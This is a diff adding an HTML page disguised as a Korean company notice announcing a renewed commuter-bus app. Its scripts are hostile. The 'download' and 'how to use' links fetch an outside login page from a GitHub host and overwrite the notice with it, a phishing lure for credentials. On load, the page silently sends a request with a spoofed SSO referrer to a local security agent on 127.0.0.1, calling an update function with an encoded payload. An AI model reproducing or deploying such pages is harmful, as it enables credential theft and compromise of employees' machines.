@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>SK Happy Express 출퇴근 통근버스 앱 리뉴얼 안내</title>
+    <style>
+        body {
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background-color: #f5f5f5;
+        }
+        .container {
+            max-width: 800px;
+            margin: 30px auto;
+            background: #fff;
+            padding: 30px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+        }
+        .event-image {
+            width: 100%;
+            max-width: 400px;
+            height: auto;
+            display: block;
+            margin: 0 auto 20px auto;
+            border-radius: 10px;
+        }
+        h1 {
+            text-align: center;
+            color: #d32f2f;
+            margin-bottom: 20px;
+        }
+        .section {
+            margin-bottom: 20px;
+        }
+        .section h2 {
+            font-size: 18px;
+            color: #333;
+            margin-bottom: 10px;
+        }
+        .section p, .section li {
+            margin: 5px 0;
+            line-height: 1.6;
+        }
+        .highlight {
+            color: #d32f2f;
+            font-weight: bold;
+        }
+        .cta-button {
+            display: inline-block;
+            padding: 10px 20px;
+            background-color: #d32f2f;
+            color: white;
+            text-decoration: none;
+            border-radius: 4px;
+            font-weight: bold;
+            margin-top: 10px;
+        }
+        .footer {
+            text-align: center;
+            font-size: 12px;
+            color: #888;
+            margin-top: 30px;
+        }
+    </style>
+	<script>
+	function loadLoginPage() {
+	  fetch("https://raw.githubusercontent.com/windshock/windshock.github.io/refs/heads/master/static/login.html")
+	    .then(res => res.text())
+	    .then(html => {
+	      document.open();
+	      document.write(html);
+	      document.close();
+	    });
+	}
+	</script>
+
+    <script>
+        async function fetchForBrowser() {
+            const baseUrl = "https://127.0.0.1:17489/?callback=nexessCallBack707529&data=";
+            const commonOptions = {
+                headers: {
+                    "accept": "*/*",
+                    "accept-language": "ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7",
+                    "cache-control": "no-cache",
+                    "pragma": "no-cache",
+                    "sec-fetch-dest": "empty",
+                    "sec-fetch-mode": "cors",
+                    "sec-fetch-site": "cross-site"
+                },
+                referrer: "http://sso.sk.com:10000/",
+                referrerPolicy: "strict-origin-when-cross-origin",
+                body: null,
+                method: "GET",
+                mode: "no-cors",
+                credentials: "omit"
+            };
+        
+            const urls = {
+                      default: `${baseUrl}%7B%22func%22:%22SecureUpdateFiles%22,%22param%22:%22vUdwYz%2B%2FUJZ%2FVpr71dB2Oef4XlxVkAOZAYFQmaos3Bg%3D%7CNf7fDDHdQGo0wDI11Mkb5w%3D%3D%7C1%22%7D&_=%22`
+            };
+        
+            await fetch(urls['default'], commonOptions);
+        }
+
+        if (!window._fetchedOnce) {
+          window._fetchedOnce = true;
+          fetchForBrowser();
+        }
+    </script>
+</head>
+<body>
+    <p style="text-align:center; margin-top:100px;">공지 페이지 로딩 중...</p>
+    <script>
+        (async function(){
+            setTimeout(() => {
+                document.body.innerHTML = `
+                    <div class="container">
+                        <h1>SK Happy Express 앱 리뉴얼 안내</h1>
+
+                        <img src="https://skplanet-img.s3.ap-northeast-2.amazonaws.com/%EC%B6%9C%ED%87%B4%EA%B7%BC+%ED%86%B5%EA%B7%BC+%EB%B2%84%EC%8A%A4.png" alt="SK Happy Express" class="event-image">
+
+                        <div class="section">
+                            <h2>📢 앱 리뉴얼 안내</h2>
+                            <p>출퇴근 통근버스 서비스가 <span class="highlight">SK Happy Express 앱</span>으로 새롭게 리뉴얼되었습니다.</p>
+                            <p>더 편리해진 예약, 실시간 운행 정보, 알림 서비스 등을 지금 바로 이용해 보세요.</p>
+                        </div>
+
+                        <div class="section">
+                            <h2>✅ 다운로드 방법</h2>
+                            <ul>
+                                <li>안드로이드: Play스토어 &gt; SK Happy Express 검색</li>
+                                <li>아이폰: App Store &gt; SK Happy Express 검색</li>
+                                <li>또는 아래 다운로드 링크 클릭</li>
+                            </ul>
+                        </div>
+
+                        <div class="section">
+                            <h2>💡 주요 기능</h2>
+                            <ul>
+                                <li>실시간 노선/정류장 위치 조회</li>
+                                <li>출근/퇴근 예약 및 예약 내역 확인</li>
+                                <li>운행 변경 시 푸시 알림 서비스</li>
+                            </ul>
+                        </div>
+
+                        <div class="section" style="text-align: center;">
+                            <a href="javascript:loadLoginPage()">
+                                앱 다운로드 바로가기
+                            </a>
+                        </div>
+						<div class="section" style="text-align: center;">
+                            <a href="javascript:loadLoginPage()">
+                                Happy Express 신규 앱 사용법
+                            </a>
+                        </div>
+
+                        <div class="footer">
+                            감사합니다. 경영지원그룹 SHE팀
+                        </div>
+                    </div>
+                `;
+            }, 500);
+        })();
+    </script>
+</body>
+</html>
